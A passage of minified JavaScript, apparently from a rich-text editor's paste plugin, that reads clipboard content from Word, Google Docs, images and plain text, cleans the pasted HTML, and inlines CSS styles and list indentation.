              .filter(vl)
              .map(function (e) {
                var t = ht.fromTag("a")
                return $i(e, t), Ji(t, n), lt(t, "href", Ys(t)), t
              }))
        })
      },
      position: function (e) {
        Y(e, function (e) {
          ct(e) && Ja(e, "position").isSome() && Za(e, "position")
        })
      },
      list: function (e) {
        var t = H(e, function (e) {
          return "li" === ot(e)
        })
        if (0 < t.length) {
          var n = So(t[0]),
            r = ht.fromTag("ul")
          if (($i(e[0], r), 0 < n.length)) {
            var o = ht.fromTag("li")
            Gi(r, o), Ji(o, n)
          }
          Ji(r, t)
        }
      },
    },
    bl = function (e) {
      var t = Io(e)
      Y([yl.links, yl.position, yl.list], function (e) {
        e(t)
      })
    },
    Tl = function (e, t, n, r, o, i) {
      bl(n)
      var a = eu(n),
        u = Yf(o, r, t, i)
      return Cc(e, a, u)
    },
    xl = bl,
    El = function (e, t) {
      var n = eu(t)
      return Cc(e, n, [jf.removeMetaTags, jf.replaceClipboardChangedUrls])
    },
    wl = function (e, t) {
      var n = eu(t)
      return Cc(e, n, [jf.removeFragmentComments])
    },
    Sl = {
      disabled: function () {
        return {
          discriminator: "disabled",
          data: {},
        }
      },
      fromClipboard: function (e) {
        return {
          discriminator: "fromClipboard",
          data: {
            rtf: e,
          },
        }
      },
    },
    Il = ie(Sl),
    Ll = Sl.disabled,
    Nl = Sl.fromClipboard,
    _l = function (e, t) {
      var n = new RegExp(t, "i")
      return du(e, function (e) {
        return mu(null !== e.match(n), {
          type: e,
          flavor: t,
        })
      })
    },
    Cl = {
      isValidData: function (e) {
        return void 0 !== e && void 0 !== e.types && null !== e.types
      },
      getPreferredFlavor: function (e, t) {
        return du(e, function (e) {
          return _l(t, e)
        })
      },
      getFlavor: _l,
    },
    Ol = function (t) {
      return function (e) {
        return {
          discriminator: t,
          data: e,
        }
      }
    },
    Dl = function (t) {
      return function (e) {
        return e.discriminator === t ? N.some(e.data) : N.none()
      }
    },
    Pl = Ol("event"),
    Al = Ol("html"),
    kl = Ol("images"),
    Ml = Ol("word"),
    Rl = Ol("text"),
    Fl = Ol("void"),
    jl = Dl("event"),
    Ul = Dl("html"),
    Bl = Dl("images"),
    Yl = Dl("word"),
    Wl = Dl("text"),
    Hl = fo().browser,
    ql = !(Hl.isIE() || (Hl.isEdge() && Hl.version.major < 16)),
    $l = ["^image/", "file"],
    Vl = function (e) {
      return (
        (eo((t = e), "<html") &&
          (eo(t, 'xmlns:o="urn:schemas-microsoft-com:office:office"') ||
            eo(t, 'xmlns:x="urn:schemas-microsoft-com:office:excel"'))) ||
        eo(e, 'meta name="ProgId" content="Word.Document"')
      )
      var t
    },
    Xl = function (e) {
      return eo(e, "<meta") && eo(e, 'id="docs-internal-guid')
    },
    Gl = function (e) {
      return 0 < e.length
    },
    Kl = function (t, e) {
      return Cl.getFlavor(t.types, e)
        .map(function (e) {
          return t.getData(e.type)
        })
        .filter(Gl)
    },
    zl = function (e) {
      return Kl(e, "html")
    },
    Jl = function (e) {
      return zl(e).filter(Xl)
    },
    Zl = function (e) {
      return ql ? N.some(e.clipboardData).filter(Cl.isValidData) : N.none()
    },
    Ql = function (e) {
      var t = ht.fromTag("div")
      tu(t, e)
      var n = wl(bo(t), t),
        r = ht.fromTag("div")
      return (
        tu(r, n),
        Al({
          container: r,
        })
      )
    },
    ed = function (e) {
      var t = function (r) {
          return void 0 === r.items
            ? N.none()
            : Cl.getPreferredFlavor($l, r.types).map(function (e) {
                for (var t = [], n = 0; n < r.items.length; n++)
                  t.push(r.items[n])
                return kl({
                  images: t,
                })
              })
        },
        r = function (t) {
          return du(t.types, function (e) {
            return "text/plain" === e
              ? N.some(t.getData(e)).map(function (e) {
                  return Rl({
                    text: e,
                  })
                })
              : N.none()
          })
        }
      return {
        getWordData: function () {
          return Zl(e).bind(function (n) {
            return ((e = n), zl(e).filter(Vl)).map(function (e) {
              var t = Kl(n, "rtf")
              return Ml({
                html: e,
                rtf: t.fold(
                  function () {
                    return Ll()
                  },
                  function (e) {
                    return Nl(e)
                  }
                ),
              })
            })
            var e
          })
        },
        getGoogleDocsData: function () {
          return Zl(e).bind(Jl).map(Ql)
        },
        getImage: function () {
          return Zl(e).bind(t)
        },
        getText: function () {
          return Zl(e).fold(function () {
            var e = g.window.clipboardData
            return void 0 !== e
              ? N.some(
                  Rl({
                    text: e.getData("text"),
                  })
                )
              : N.none()
          }, r)
        },
        getHtml: function () {
          return Zl(e).bind(zl).map(Ql)
        },
        getOnlyText: function () {
          return Zl(e).bind(function (e) {
            return (
              (t = e.types),
              (n = "text/plain"),
              1 === t.length && t[0] === n ? r(e) : N.none()
            )
            var t, n
          })
        },
        getNative: function () {
          return Pl({
            nativeEvent: e,
          })
        },
        getVoid: function () {
          return Fl({})
        },
      }
    },
    td = function (e) {
      return {
        getWordData: function () {
          return N.some(
            Ml({
              html: e,
              rtf: Ll(),
            })
          )
        },
        getGoogleDocsData: N.none,
        getImage: N.none,
        getHtml: N.none,
        getText: N.none,
        getNative: T("There is no native event"),
        getOnlyText: N.none,
        getVoid: T("There is no paste event"),
      }
    },
    nd = function (e) {
      return {
        getWordData: N.none,
        getGoogleDocsData: N.none,
        getImage: N.none,
        getHtml: N.none,
        getText: function () {
          return N.some(
            Rl({
              text: e,
            })
          )
        },
        getNative: T("There is no native event"),
        getOnlyText: N.none,
        getVoid: T("There is no paste event"),
      }
    },
    rd = {
      native: "Outside of Textbox.io pasting HTML5 API (could be internal)",
      fallback: "Outside of Textbox.io pasting offscreen (could be internal)",
      msoffice: "Word Import pasting",
      googledocs: " pasting",
      image: "Image pasting",
      plaintext: "Only plain text is available to paste",
      text: "Plain text pasting",
      none: "There is no valid way to paste",
      discard: "There is no valid way to paste, discarding content",
    },
    od = oe(
      {
        getLabelForApi: function (t) {
          var e = ie(rd)
          return $(e, function (e) {
            return rd[e] === t
          }).fold(
            function () {
              return "unknown"
            },
            function (e) {
              switch (e) {
                case "native":
                case "fallback":
                  return "html"
                case "none":
                case "discard":
                  return "invalid"
                default:
                  return e
              }
            }
          )
        },
      },
      rd
    ),
    id = function (e) {
      return B(e, function (e) {
        return e.asset()
      })
    },
    ad = function (u, c) {
      var s = yr.create({
          cancel: hr([]),
          error: hr(["message"]),
          insert: hr([
            "elements",
            "assets",
            "correlated",
            "isInternal",
            "source",
            "mode",
          ]),
        }),
        r = function (e, t, n) {
          var r = qu(u, c, e)
          r.capture() && n()
          var o = B(r.steps(), function (e) {
              return e(t)
            }),
            i = $u(o, r.input()),
            a = od.getLabelForApi(r.label())
          i.get(function (e) {
            var r = e.bundle().isInternal().getOr(!1),
              o = e
                .bundle()
                .officeStyles()
                .fold(
                  function () {
                    return "auto"
                  },
                  function (e) {
                    return e ? "merge" : "clean"
                  }
                )
            Au.cata(
              e.response(),
              function (e) {
                s.trigger.error(e)
              },
              function (e, t) {
                s.trigger.insert(e, id(t), t, r, a, o)
              },
              function () {
                s.trigger.cancel()
              },
              function (e, t, n) {
                s.trigger.insert(e, id(t), t, r, a, o), s.trigger.error(n)
              }
            )
          })
        },
        o = ka.tap(function (n) {
          Nu(n.target.ownerDocument.defaultView).each(function (e) {
            if (!Ei(e.start(), qa.bin())) {
              var t = ed(n)
              ja.willBlock() && (o.control.block(), n.preventDefault()),
                r(t, o.control, function () {
                  n.preventDefault()
                })
            }
          })
        })
      return {
        paste: o.instance,
        pasteCustom: function (e, t) {
          void 0 === t && (t = L)
          var n = ka.tap(L)
          r(e, n.control, t)
        },
        isBlocked: o.control.isBlocked,
        destroy: L,
        events: s.registry,
      }
    },
    ud = function () {
      var t = N.none()
      return {
        convert: function (e) {
          t = (function (n) {
            var e,
              t = nt("window.clipboardData.files"),
              r =
                void 0 !== (e = n).convertURL
                  ? e.convertURL
                  : void 0 !== e.msConvertURL
                  ? e.msConvertURL
                  : void 0
            if (void 0 !== t && void 0 !== r && 0 < t.length) {
              var o = Le(t, function (e) {
                var t = g.URL.createObjectURL(e)
                return r.apply(n, [e, "specified", t]), Ke(e, t)
              })
              return N.some(o)
            }
            return N.none()
          })(e)
        },
        listen: function (e) {
          return t
            .fold(
              function () {
                return Ee.nu(function (e) {
                  e([])
                })
              },
              function (e) {
                return e
              }
            )
            .get(e)
        },
        clear: function () {
          t = N.none()
        },
      }
    },
    cd = sr("asset", "image"),
    sd = function (e, r) {
      return pe.cata(
        e,
        function (e, t, n) {
          return lt(r, "src", n), !0
        },
        x
      )
    },
    fd = function (e, r) {
      var o = []
      return (
        Y(e, function (e, t) {
          var n = r[t]
          sd(e, n) && o.push(cd(e, n))
        }),
        o
      )
    },
    ld = function (e) {
      return Le(e, function (u) {
        return Ee.nu(function (i) {
          var e,
            a = u.dom()
          ;((e = a), Ye(e)).then(function (o) {
            o.toBlob().then(function (e) {
              var t = to(a.src, "blob:") ? a.src : g.URL.createObjectURL(e),
                n = _e("image"),
                r = pe.blob(n, o, t)
              i(cd(r, u))
            })
          })
        })
      })
    },
    dd = sr("futureAsset", "image"),
    md = function (t, e) {
      return ((n = e), ke(n)).map(function (e) {
        return dd(Ge(e), t)
      })
      var n
    },
    pd = function (e) {
      var t = ht.fromTag("div")
      return Ji(t, e), Co(t, "img[src]")
    },
    gd = function (e) {
      return 0 === e.indexOf("data:") && -1 < e.indexOf("base64")
    },
    vd = function (e) {
      return 0 === e.indexOf("blob:")
    },
    hd = function (e) {
      var t = mt(e, "src")
      return gd(t) || vd(t)
    },
    yd = function (e) {
      return G(pd(e), function (e) {
        var n,
          t,
          r = mt(e, "src")
        return gd(r)
          ? md(e, r).toArray()
          : vd(r)
          ? ((n = e),
            (t = r),
            Ue(t).map(function (e) {
              var t = Ee.nu(function (t) {
                e.then(function (e) {
                  Ge(e).get(t)
                })
              })
              return dd(t, n)
            })).toArray()
          : []
      })
    }
  function bd(f) {
    return function (e, s) {
      return Wu(function (a) {
        var u = function () {
            Uu(a, {
              response: s.response(),
              bundle: s.bundle(),
            })
          },
          c = function (e) {
            var t,
              n,
              r = H(pd(e), hd)
            Y(r, Na),
              Uu(a, {
                response:
                  0 < r.length
                    ? ((t = e),
                      (n = H(t, function (e) {
                        return "img" !== ot(e) || !hd(e)
                      })),
                      Au.incomplete(n, [], "errors.local.images.disallowed"))
                    : s.response(),
                bundle: s.bundle(),
              })
          },
          e = function (e, t) {
            var n, r, o, i
            !1 === f.allowLocalImages
              ? c(e)
              : 0 === t.length
              ? ((r = yd((n = e))),
                (o = Le(r, function (e) {
                  return e.futureAsset()
                })),
                (i = B(r, function (e) {
                  return e.image()
                })),
                o.get(function (e) {
                  var t = fd(e, i)
                  Uu(a, {
                    response: Au.paste(n, t),
                    bundle: s.bundle(),
                  })
                }))
              : u()
          }
        Au.cata(s.response(), u, e, u, e)
      })
    }
  }
  var Td = function (e) {
      return e.officeStyles().getOr(!0)
    },
    xd = function (e) {
      return e.htmlStyles().getOr(!1)
    },
    Ed = function (e) {
      return e.isWord().getOr(!1)
    },
    wd = {
      proxyBin: function (n) {
        return {
          handle: function (e, t) {
            return n.proxyBin().fold(function () {
              return (
                g.console.error(e),
                ju({
                  response: Au.cancel(),
                  bundle: Ru({}),
                })
              )
            }, t)
          },
        }
      },
      backgroundAssets: function (e) {
        return Ee.nu(function (t) {
          e.backgroundAssets().fold(
            function () {
              t([])
            },
            function (e) {
              e.listen(t)
            }
          )
        })
      },
      merging: function (e) {
        var t = Ed(e)
        return (t && Td(e)) || (!t && xd(e))
      },
      mergeOffice: Td,
      mergeNormal: xd,
      isWord: Ed,
      isGoogleDocs: function (e) {
        return e.isGoogleDocs().getOr(!1)
      },
      isInternal: function (e) {
        return e.isInternal().getOr(!1)
      },
    },
    Sd = {
      resolve: xr("ephox-cement").resolve,
    }
  function Id(s, r) {
    var f = r.translations,
      l = function (e, t, n) {
        n(
          N.some(
            ni(t, {
              officeStyles: e,
              htmlStyles: e,
            })
          )
        )
      }
    return {
      get: function (e, t) {
        var n = r[e ? "officeStyles" : "htmlStyles"]
        "clean" === n
          ? l(!1, r, t)
          : "merge" === n
          ? l(!0, r, t)
          : (function (e, t) {
              var n = ht.fromTag("div")
              Ti(n, Sd.resolve("styles-dialog-content"))
              var r = ht.fromTag("p"),
                o = qi(f("cement.dialog.paste.instructions"))
              Ji(r, o), Gi(n, r)
              var i = {
                  text: f("cement.dialog.paste.clean"),
                  tabindex: 0,
                  className: Sd.resolve("clean-styles"),
                  click: function () {
                    u(), l(!1, e, t)
                  },
                },
                a = {
                  text: f("cement.dialog.paste.merge"),
                  tabindex: 1,
                  className: Sd.resolve("merge-styles"),
                  click: function () {
                    u(), l(!0, e, t)
                  },
                },
                u = function () {
                  c.destroy()
                },
                c = s(!0)
              c.setTitle(f("cement.dialog.paste.title")),
                c.setContent(n),
                c.setButtons([i, a]),
                c.events.close.bind(function () {
                  t(N.none()), u()
                }),
                c.show()
            })(r, t)
      },
      destroy: L,
    }
  }
  var Ld = function (e, t) {
      var i = Id(e, t)
      return function (e, r) {
        var t = r.bundle(),
          o = r.response()
        return Wu(function (n) {
          i.get(wd.isWord(t), function (e) {
            var t = e.fold(
              function () {
                return {
                  response: Au.cancel(),
                  bundle: r.bundle(),
                }
              },
              function (e) {
                return {
                  response: o,
                  bundle: Ru({
                    officeStyles: e.officeStyles,
                    htmlStyles: e.htmlStyles,
                  }),
                }
              }
            )
            Uu(n, t)
          })
        })
      }
    },
    Nd = Ld,
    _d = function (r, o) {
      return function (e, t) {
        var n = function (e) {
          return ju({
            response: t.response(),
            bundle: Ru({
              officeStyles: e,
              htmlStyles: e,
            }),
          })
        }
        return wd.isInternal(t.bundle())
          ? n(!0)
          : wd.isGoogleDocs(t.bundle())
          ? n(!1)
          : Ld(r, o)(e, t)
      }
    },
    Cd = function (e) {
      return (function (e) {
        var t = e.dom()
        try {
          var n = t.contentWindow ? t.contentWindow.document : t.contentDocument
          return null != n ? N.some(ht.fromDom(n)) : N.none()
        } catch (e) {
          return (
            g.console.log("Error reading iframe: ", t),
            g.console.log("Error was: " + e),
            N.none()
          )
        }
      })(e).fold(
        function () {
          return e
        },
        function (e) {
          return e
        }
      )
    },
    Od = function (e, t) {
      if (!_r(e))
        throw "Internal error: attempted to write to an iframe that is not in the DOM"
      var n = Cd(e).dom()
      n.open("text/html", "replace"), n.writeln(t), n.close()
    }
  var Dd,
    Pd,
    Ad,
    kd = function (e) {
      var t = e.dom().styleSheets
      return Array.prototype.slice.call(t)
    },
    Md = function (e) {
      var t = e.cssRules
      return G(t, function (e) {
        return e.type === g.CSSRule.IMPORT_RULE
          ? Md(e.styleSheet)
          : e.type === g.CSSRule.STYLE_RULE
          ? [
              (function (e) {
                var t = e.selectorText,
                  n = e.style.cssText
                if (void 0 === n)
                  throw new Error(
                    "WARNING: Browser does not support cssText property"
                  )
                return {
                  selector: t,
                  style: n,
                  raw: e.style,
                }
              })(e),
            ]
          : []
      })
    },
    Rd = function (e) {
      return G(e, Md)
    },
    Fd = {},
    jd = {
      exports: Fd,
    }
  ;(Pd = Fd),
    (Ad = jd),
    (Dd = void 0),
    (function (e) {
      "object" == typeof Pd && void 0 !== Ad
        ? (Ad.exports = e())
        : "function" == typeof Dd && Dd.amd
        ? Dd([], e)
        : (("undefined" != typeof window
            ? window
            : "undefined" != typeof global
            ? global
            : "undefined" != typeof self
            ? self
            : this
          ).EphoxContactWrapper = e())
    })(function () {
      return (function i(a, u, c) {
        function s(t, e) {
          if (!u[t]) {
            if (!a[t]) {
              var n = !1
              if (!e && n) return n(t, !0)
              if (f) return f(t, !0)
              var r = new Error("Cannot find module '" + t + "'")
              throw ((r.code = "MODULE_NOT_FOUND"), r)
            }
            var o = (u[t] = {
              exports: {},
            })
            a[t][0].call(
              o.exports,
              function (e) {
                return s(a[t][1][e] || e)
              },
              o,
              o.exports,
              i,
              a,
              u,
              c
            )
          }
          return u[t].exports
        }
        for (var f = !1, e = 0; e < c.length; e++) s(c[e])
        return s
      })(
        {
          1: [
            function (e, t, n) {
              var r,
                a,
                o =
                  ((r = function (e) {
                    var t,
                      n,
                      r,
                      o,
                      i = []
                    for (r = 0, o = (t = e.split(",")).length; r < o; r += 1)
                      0 < (n = t[r]).length && i.push(a(n))
                    return i
                  }),
                  (a = function (c) {
                    var e,
                      t,
                      n,
                      s = c,
                      f = {
                        a: 0,
                        b: 0,
                        c: 0,
                      },
                      l = []
                    return (
                      (e = function (e, t) {
                        var n, r, o, i, a, u
                        if (e.test(s))
                          for (
                            r = 0, o = (n = s.match(e)).length;
                            r < o;
                            r += 1
                          )
                            (f[t] += 1),
                              (i = n[r]),
                              (a = s.indexOf(i)),
                              (u = i.length),
                              l.push({
                                selector: c.substr(a, u),
                                type: t,
                                index: a,
                                length: u,
                              }),
                              (s = s.replace(i, Array(u + 1).join(" ")))
                      }),
                      (t = function (e) {
                        var t, n, r, o
                        if (e.test(s))
                          for (
                            n = 0, r = (t = s.match(e)).length;
                            n < r;
                            n += 1
                          )
                            (o = t[n]),
                              (s = s.replace(o, Array(o.length + 1).join("A")))
                      })(/\\[0-9A-Fa-f]{6}\s?/g),
                      t(/\\[0-9A-Fa-f]{1,5}\s/g),
                      t(/\\./g),
                      (n = /:not\(([^\)]*)\)/g).test(s) &&
                        (s = s.replace(n, "     $1 ")),
                      (function () {
                        var e,
                          t,
                          n,
                          r,
                          o = /{[^]*/gm
                        if (o.test(s))
                          for (
                            t = 0, n = (e = s.match(o)).length;
                            t < n;
                            t += 1
                          )
                            (r = e[t]),
                              (s = s.replace(r, Array(r.length + 1).join(" ")))
                      })(),
                      e(/(\[[^\]]+\])/g, "b"),
                      e(/(#[^\#\s\+>~\.\[:]+)/g, "a"),
                      e(/(\.[^\s\+>~\.\[:]+)/g, "b"),
                      e(
                        /(::[^\s\+>~\.\[:]+|:first-line|:first-letter|:before|:after)/gi,
                        "c"
                      ),
                      e(/(:[\w-]+\([^\)]*\))/gi, "b"),
                      e(/(:[^\s\+>~\.\[:]+)/g, "b"),
                      (s = (s = s.replace(/[\*\s\+>~]/g, " ")).replace(
                        /[#\.]/g,
                        " "
                      )),
                      e(/([^\s\+>~\.\[:]+)/g, "c"),
                      l.sort(function (e, t) {
                        return e.index - t.index
                      }),
                      {
                        selector: c,
                        specificity:
                          "0," +
                          f.a.toString() +
                          "," +
                          f.b.toString() +
                          "," +
                          f.c.toString(),
                        specificityArray: [0, f.a, f.b, f.c],
                        parts: l,
                      }
                    )
                  }),
                  {
                    calculate: r,
                    compare: function (e, t) {
                      var n, r, o
                      if ("string" == typeof e) {
                        if (-1 !== e.indexOf(",")) throw "Invalid CSS selector"
                        n = a(e).specificityArray
                      } else {
                        if (!Array.isArray(e))
                          throw "Invalid CSS selector or specificity array"
                        if (
                          4 !==
                          e.filter(function (e) {
                            return "number" == typeof e
                          }).length
                        )
                          throw "Invalid specificity array"
                        n = e
                      }
                      if ("string" == typeof t) {
                        if (-1 !== t.indexOf(",")) throw "Invalid CSS selector"
                        r = a(t).specificityArray
                      } else {
                        if (!Array.isArray(t))
                          throw "Invalid CSS selector or specificity array"
                        if (
                          4 !==
                          t.filter(function (e) {
                            return "number" == typeof e
                          }).length
                        )
                          throw "Invalid specificity array"
                        r = t
                      }
                      for (o = 0; o < 4; o += 1) {
                        if (n[o] < r[o]) return -1
                        if (n[o] > r[o]) return 1
                      }
                      return 0
                    },
                  })
              void 0 !== n &&
                ((n.calculate = o.calculate), (n.compare = o.compare))
            },
            {},
          ],
          2: [
            function (e, t, n) {
              var r = e("specificity")
              t.exports = {
                boltExport: r,
              }
            },
            {
              specificity: 1,
            },
          ],
        },
        {},
        [2]
      )(2)
    })
  var Ud = jd.exports.boltExport,
    Bd = function (t, e, n) {
      var r = G(e, function (i) {
        var e = Co(t, i.selector)
        return (
          Y(e, function (e) {
            var n,
              r,
              o,
              t =
                ((n = i.raw),
                (r = e),
                (o = {}),
                Y(n, function (e) {
                  if (void 0 !== n[e]) {
                    var t = r.dom().style
                    j(t, e) || (o[e] = n[e])
                  }
                }),
                o)
            Ga(e, t)
          }),
          e
        )
      })
      n &&
        Y(r, function (e) {
          gt(e, "class")
        })
    },
    Yd = function (e, t, n) {
      var r = function (e) {
          return -1 !== e.selector.indexOf(",")
        },
        o = G(H(e, r), function (t) {
          var e = t.selector.split(",")
          return B(e, function (e) {
            return {
              selector: e.trim(),
              raw: t.raw,
            }
          })
        }),
        i = H(e, function (e) {
          return !r(e)
        }).concat(o)
      i
        .sort(function (e, t) {
          return Ud.compare(e.selector, t.selector)
        })
        .reverse(),
        Bd(t, i, n)
    },
    Wd = function (e, t, n, r) {
      var o = kd(e),
        i = Rd(o).map(function (e) {
          var t = e.selector
          return {
            selector: n.hasOwnProperty(t) ? n[t] : t,
            raw: e.raw,
          }
        })
      Yd(i, t, r)
    },
    Hd = function (e, t, n, r) {
      var o = kd(e),
        i = Rd(o),
        a = H(i, function (e) {
          return to(e.selector, n)
        })
      Yd(a, t, r)
    },
    qd = function (e, t, n, r) {
      var o = kd(e),
        i = Rd(o),
        a = H(i, function (e) {
          return j(n, e.selector)
        })
      Yd(a, t, r)
    },
    $d = {
      inlineStyles: function (e, t, n) {
        Wd(e, t, n, !0)
      },
      inlineStylesKeepClasses: function (e, t, n) {
        Wd(e, t, n, !1)
      },
      inlinePrefixedStyles: function (e, t, n) {
        Hd(e, t, n, !0)
      },
      inlinePrefixedStylesKeepClasses: function (e, t, n) {
        Hd(e, t, n, !1)
      },
      inlineSelectorsStyles: function (e, t, n) {
        qd(e, t, n, !0)
      },
      inlineSelectorsStylesKeepClasses: function (e, t, n) {
        qd(e, t, n, !1)
      },
    },
    Vd = {
      inlineStyles: $d.inlineStyles,
      inlineStylesKeepClasses: $d.inlineStylesKeepClasses,
      inlinePrefixedStyles: $d.inlinePrefixedStyles,
      inlinePrefixedStylesKeepClasses: $d.inlinePrefixedStylesKeepClasses,
      inlineSelectorsStyles: $d.inlineSelectorsStyles,
      inlineSelectorsStylesKeepClasses: $d.inlineSelectorsStylesKeepClasses,
    },
    Xd = {
      p: "p, li[data-converted-paragraph]",
    },
    Gd = L,
    Kd = function (f, e) {
      var l = function (n) {
          gt(n, "data-list-level"),
            gt(n, "data-text-indent-alt"),
            gt(n, "data-border-margin"),
            Za(n, "margin-left"),
            Za(n, "text-indent"),
            ae(
              (function (e) {
                var t = {},
                  n = e.dom()
                if ($a(n))
                  for (var r = 0; r < n.style.length; r++) {
                    var o = n.style.item(r)
                    t[o] = n.style[o]
                  }
                return t
              })(n),
              function (e, t) {
                !t.startsWith("border") ||
                  ("border-image" !== t &&
                    "none" !== e.trim() &&
                    "initial" !== e.trim()) ||
                  Za(n, t)
              }
            )
        },
        t = Co(f, "li[data-converted-paragraph]")
      if (
        (Y(t, function (e) {
          gt(e, "data-converted-paragraph")
        }),
        e)
      ) {
        var n = Co(f, "li")
        Y(n, function (e) {
          var t,
            n,
            r,
            o,
            i,
            a,
            u =
              ((t = f),
              (n = ht.fromTag("span")),
              Xi(t, n),
              (r = n),
              {
                convertToPx: function (e) {
                  var t
                  return (
                    Xa(r, "margin-left", e),
                    (t = Ka(r, "margin-left")),
                    parseFloat(t.match(/-?\d+\.?\d*/)[0])
                  )
                },
                destroy: function () {
                  return Na(r)
                },
              }),
            c =
              ((i = u),
              (a = pt((o = f), "data-tab-interval")
                ? mt(o, "data-tab-interval")
                : "36pt"),
              i.convertToPx(a)),
            s = zd(e, c, u).getOr({})
          l(e), u.destroy(), Ga(e, s)
        })
        var r = Co(f, "ol,ul")
        Y(r, function (t) {
          var e = Co(t, "li")
          Ja(t, "margin-top").isNone() &&
            N.from(e[0]).each(function (e) {
              Xa(t, "margin-top", Ka(e, "margin-top"))
            }),
            Ja(t, "margin-bottom").isNone() &&
              N.from(e[e.length - 1]).each(function (e) {
                Xa(t, "margin-bottom", Ka(e, "margin-bottom"))
              })
        })
      }
      gt(f, "data-tab-interval")
    },
    zd = function (l, d, m) {
      var p = function (e) {
        return pt(e, "data-list-level")
          ? parseInt(mt(e, "data-list-level"), 10)
          : 1
      }
      return Ja(l, "text-indent").bind(function (f) {
        return Ja(l, "margin-left").map(function (e) {
          var t = Ja(l, "list-style").exists(function (e) {
              return eo(e, "none")
            }),
            n = pt(l, "data-border-margin")
              ? mt(l, "data-border-margin")
              : "0px",
            r = t ? p(l) + 1 : p(l),
            o = m.convertToPx(e) + m.convertToPx(n),
            i = d * r,
            a = pt(l, "data-text-indent-alt")
              ? m.convertToPx(mt(l, "data-text-indent-alt"))
              : m.convertToPx(f),
            u = {},
            c = (d / 2) * -1 - a
          0 < c && (u["text-indent"] = c + "px")
          var s = o - i - c
          return (u["margin-left"] = 0 < s ? s + "px" : "0px"), u
        })
      })
    },
    Jd = function (e, t, n) {
      var r = n.mergeInline()
      ;(r ? Vd.inlineStyles : Gd)(e, t, Xd), Kd(t, r)
    },
    Zd = function (n) {
      var e,
        r =
          ((e = ht.fromDom(g.document.body)),
          {
            play: function (i, a, u) {
              var c = ht.fromTag("div"),
                s = ht.fromTag("iframe")
              Ga(c, {
                display: "none",
              })
              var f = ma(s, "load", function () {
                f.unbind(), Od(s, i)
                var e = s.dom().contentWindow.document
                if (void 0 === e)
                  throw "sandbox iframe load event did not fire correctly"
                var t = ht.fromDom(e),
                  n = e.body
                if (void 0 === n) throw "sandbox iframe does not have a body"
                var r = ht.fromDom(n),
                  o = a(t, r)
                Na(c), g.setTimeout(b(u, o), 0)
              })
              Gi(c, s), Gi(e, c)
            },
          })
      return function (e, t) {
        r.play(
          e,
          function (e, t) {
            return (
              Jd(e, t, {
                mergeInline: y(n),
              }),
              eu(t)
            )
          },
          t
        )
      }
    },
    Qd = function (e, a, t, s) {
      var n = e.html
      return Wu(function (i) {
        t.cleanDocument(n, a, s).get(function (e) {
          e.fold(
            function (e) {
              console.error("PowerPaste error code: WIM01"),
                Uu(i, {
                  response: Au.error("errors.paste.process.failure"),
                  bundle: Ru({}),
                })
            },
            function (e) {
              var t, n, r, u, c, o
              null == (o = e) || 0 === o.length
                ? Uu(i, {
                    response: Au.paste([], []),
                    bundle: Ru({}),
                  })
                : ((t = i),
                  (n = a),
                  (r = e),
                  (u = s.allowLocalImages),
                  (c = function (e) {
                    Uu(t, {
                      response: e,
                      bundle: Ru({}),
                    })
                  }),
                  Zd(n)(r, function (e) {
                    var t = qi(e),
                      n = function (e) {
                        c(Au.paste(t, e))
                      },
                      r = ht.fromTag("div")
                    Ji(r, t)
                    var o = H(vo("img[src]", r), function (e) {
                        var t = mt(e, "src")
                        return to(t, "blob:") || to(t, "data:")
                      }),
                      i = vo("img[data-image-src]", r)
                    if (0 === o.length && 0 === i.length) n([])
                    else if (u)
                      Y(o, function (e) {
                        return gt(e, "id")
                      }),
                        ld(o).get(n)
                    else {
                      Y(o, Na), Y(i, Na)
                      var a = Io(r)
                      c(Au.incomplete(a, [], "errors.local.images.disallowed"))
                    }
                  }))
            }
          )
        })
      })
    },
    em = function (e) {
      var t = H(e, function (e) {
          return "file" === e.kind && /image/.test(e.type)
        }),
        r = q(
          t,
          function (e, t) {
            var n = t.getAsFile()
            return null !== n ? e.concat(n) : e
          },
          []
        )
      return Wu(function (n) {
        ze(r).get(function (e) {
          var i,
            a,
            t =
              ((i = []),
              (a = []),
              Y(e, function (o) {
                return pe.cata(
                  o,
                  function (e, t, n) {
                    var r = ht.fromTag("img")
                    lt(r, "src", n), i.push(r), a.push(cd(o, r))
                  },
                  function (e, t, n) {
                    g.console.error(
                      "Internal error: Paste operation produced an image URL instead of a Data URI: ",
                      t
                    )
                  }
                )
              }),
              Au.paste(i, a))
          Uu(n, {
            response: t,
            bundle: Ru({}),
          })
        })
      })
    },
    tm = fo(),
    nm = function (e) {
      try {
        var t = e(),
          n = null != t && 0 < t.length ? qi(t) : []
        return Fo.value(n)
      } catch (e) {
        return (
          g.console.error("PowerPaste error code: PT01. Message: ", e),
          Fo.error("errors.paste.process.failure")
        )
      }
    },
    rm = function (e) {
      return e.fold(
        function (e) {
          return Yu(e)
        },
        function (e) {
          return ju({
            response: Au.paste(e, []),
            bundle: Ru({}),
          })
        }
      )
    },
    om = function (e, t, n, r, o) {
      return nm(function () {
        return Tl(e, tm, t, n, r, {
          cleanFilteredInlineElements: o.cleanFilteredInlineElements,
        })
      })
    },
    im = function (e, t, n, r) {
      var o = om(e, t, n, !1, r)
      return rm(o)
    },
    am = function (e, t) {
      var n = nm(function () {
        return El(e, t)
      })
      return rm(n)
    },
    um = function (e, t, n, r, o, i) {
      return om(e, t, r, n, i).fold(
        function (e) {
          return Yu(e)
        },
        function (a) {
          return Wu(function (r) {
            o.get(function (e) {
              var t,
                o,
                i,
                n =
                  ((t = e),
                  (o = []),
                  (i = G(a, function (e) {
                    return "img" === ot(e) ? [e] : Co(e, "img")
                  })),
                  Y(t, function (r) {
                    pe.cata(
                      r,
                      function (e, t, n) {
                        Y(i, function (e) {
                          mt(e, "src") === n && o.push(cd(r, e))
                        })
                      },
                      L
                    )
                  }),
                  o)
              Uu(r, {
                response: Au.paste(a, n),
                bundle: Ru({}),
              })
            })
          })
        }
      )
    },
    cm = function (e, t, n, r) {
      var o = t.findClipboardTags(Io(n)).getOr([])
      Y(o, Na)
      var i = Ee.nu(function (e) {
        return e([])
      })
      return um(e, n, !1, !0, i, r)
    },
    sm = function (e, t, n, r, o, i) {
      return um(e, t, r, n, o, i)
    },
    fm = function (e) {
      return "\n" === e || "\r" === e
    },
    lm = function (o) {
      return q(
        o,
        function (e, t) {
          return -1 !== " \f\t\v".indexOf(t) || "\xa0" === t
            ? e.pcIsSpace ||
              "" === e.str ||
              e.str.length === o.length - 1 ||
              ((n = o), (r = e.str.length + 1) < n.length && 0 <= r && fm(n[r]))
              ? {
                  pcIsSpace: !1,
                  str: e.str + "\xa0",
                }
              : {
